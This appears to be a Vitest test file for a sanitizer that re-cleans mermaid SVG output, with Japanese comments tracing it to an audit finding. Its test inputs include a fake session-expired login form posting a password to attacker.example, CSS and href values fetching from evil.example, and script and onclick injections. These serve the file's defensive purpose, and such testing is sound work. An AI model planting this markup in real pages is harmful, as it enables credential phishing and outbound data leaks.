import { JSDOM } from 'jsdom'
import { describe, expect, test } from 'vitest'
import { createMermaidSanitizer } from './mermaidRender'

// mermaid の出力の再サニタイズ (2026-11 の監査 M-2)。mermaid 本体はブラウザ専用
// なので、ここでは「mermaid が実際に残した形」の SVG 文字列を入力にする
const sanitize = createMermaidSanitizer(new JSDOM('').window.document)

const LABEL = (inner: string) =>
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50"><g class="node"><foreignObject width="80" height="40"><div xmlns="http://www.w3.org/1999/xhtml" style="display:inline-block"><span class="nodeLabel">${inner}</span></div></foreignObject></g><path d="M0 0L10 10"/></svg>`

describe('createMermaidSanitizer', () => {
  test('ラベルの form / input / button を落とす (同一オリジン上の偽ログインを防ぐ)', () => {
    const out = sanitize(
      LABEL(
        "<b>セッション切れ</b><form action='https://attacker.example/p' method='post'><input name=pw type=password><button>再ログイン</button></form>",
      ),
    )
    expect(out).not.toContain('<form')
    expect(out).not.toContain('<input')
    expect(out).not.toContain('<button')
    expect(out).not.toContain('attacker.example')
    // 装飾と文字は残る
    expect(out).toContain('<b>セッション切れ</b>')
  })

  test('外へ飛ぶ・取りに行く要素 (a / img) を落とす', () => {
    const out = sanitize(LABEL('<a href="https://evil.example">x</a><img src="https://evil.example/b.png">'))
    expect(out).not.toContain('<a ')
    expect(out).not.toContain('<img')
    expect(out).not.toContain('evil.example')
  })

  test('図そのもの (path・foreignObject・style 属性) は残す', () => {
    const out = sanitize(LABEL('<i style="color:red">ok</i>'))
    expect(out).toContain('<path d="M0 0L10 10"')
    expect(out).toContain('<foreignObject')
    expect(out).toContain('style="color:red"')
    expect(out).toContain('ok')
  })

  test('script と on* は当然落ちる', () => {
    const out = sanitize(LABEL('<span onclick="alert(1)">x</span><script>alert(1)</script>'))
    expect(out).not.toContain('onclick')
    expect(out).not.toContain('<script')
  })
})

test('CSS で外を読みに行く style は落とし、普通の <style> は残す', () => {
  const svg =
    '<svg xmlns="http://www.w3.org/2000/svg"><style>.node{fill:#fff}</style><style>.x{background:url(https://evil.example/a)}</style><rect style="cursor:image-set(\'https://evil.example/b\' 1x)" width="1"/></svg>'
  const out = sanitize(svg)
  expect(out).toContain('.node{fill:#fff}')
  expect(out).not.toContain('evil.example')
  expect(out).toContain('<rect width="1"')
})

test('文書内参照の href は残し、外への href は外す', () => {
  const out = sanitize('<svg xmlns="http://www.w3.org/2000/svg"><use href="#glyph"/><use href="https://evil.example/x.svg#g"/></svg>')
  expect(out).toContain('href="#glyph"')
  expect(out).not.toContain('evil.example')
})
